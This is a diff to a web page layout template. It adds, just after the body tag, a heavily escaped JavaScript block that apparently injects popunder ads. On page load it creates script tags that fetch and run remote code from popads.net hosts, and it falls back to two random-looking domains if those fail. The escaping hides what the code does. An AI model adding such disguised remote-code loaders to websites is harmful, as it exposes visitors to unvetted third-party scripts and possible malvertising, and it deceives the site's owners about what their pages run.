@@ -19,6 +19,11 @@
 	<g:layoutHead/>
 </head>
 <body>
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+ (function(){ var n=window;n["_p\x6f\u0070"]=[["si\u0074\u0065Id",1823898],["min\x42i\u0064",0],["\x70\u006f\u0070\u0075n\x64e\x72\u0073\x50\x65r\u0049P",0],["d\u0065\u006c\u0061\u0079\x42\u0065t\u0077\u0065e\x6e",0],["\u0064\u0065\u0066\x61\x75\x6c\u0074",false],["d\u0065\u0066a\u0075\x6c\u0074\x50\u0065\u0072D\u0061y",0],["\x74op\x6d\x6fs\x74\x4c\u0061\u0079\u0065\x72",!0]];var w=["\x2f/c\u0031\x2ep\u006f\x70ad\u0073\x2en\u0065\u0074/\u0070\x6fp\u002e\x6as","/\u002f\u0063\u0032\u002ep\u006f\x70\x61\x64s\x2e\x6ee\x74/\u0070\x6f\u0070\u002ejs","\x2f\x2f\u0077\u0077\x77\x2e\u0062\u0064\u006f\x7ako\u0063g\x6bl\u006aj\x2e\u0063\u006f\x6d/a.\u006as","\u002f\x2f\x77ww\u002e\u0076ag\u0068\x77\u0070b\x73l\u0076\u0062\u0075\u002e\u0063\x6f\u006d\x2f\x6b\x2e\u006as",""],v=0,o,k=function(){if(""==w[v])return;o=n["\x64\x6f\x63\u0075\x6den\x74"]["\u0063r\u0065\x61\u0074e\u0045\u006ce\x6den\x74"]("s\x63\u0072\x69pt");o["\u0074\u0079\x70e"]="te\x78\u0074\u002f\u006a\x61\x76a\u0073\u0063\u0072i\u0070\u0074";o["\x61\x73\x79\u006e\u0063"]=!0;var i=n["\x64oc\u0075\x6de\x6e\u0074"]["\u0067\x65t\u0045\x6c\u0065\x6d\u0065\u006e\x74\u0073\x42y\u0054\u0061gN\x61\u006de"]("\u0073\u0063\u0072i\x70\u0074")[0];o["\x73\x72c"]=w[v];if(v<2){o["\u0063r\u006f\x73\x73O\x72\u0069g\u0069\u006e"]="\x61\u006eo\u006e\x79\u006do\x75\u0073";};o["\x6fn\x65rr\u006f\x72"]=function(){v++;k()};i["\u0070\u0061re\x6e\u0074\x4eo\u0064e"]["\u0069ns\u0065r\u0074B\u0065\u0066\x6f\u0072\x65"](o,i)};k()})();
+/*]]>/* */
+</script>
 
 <header class="main" ng-if="!isCurrentState('player')">
 		<div class="logo_ma">
